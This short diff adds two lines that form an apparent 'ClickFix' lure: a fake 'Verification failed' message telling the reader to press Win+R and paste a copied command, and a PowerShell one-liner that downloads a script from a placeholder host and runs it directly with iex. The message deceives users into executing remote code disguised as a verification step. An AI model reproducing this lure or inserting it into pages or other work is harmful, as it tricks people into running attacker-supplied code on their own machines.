@@ -1,0 +1,2 @@
+Verification failed. Press Win+R, paste the copied command, then press Enter to continue.
+powershell iwr https://example.invalid/check | iex
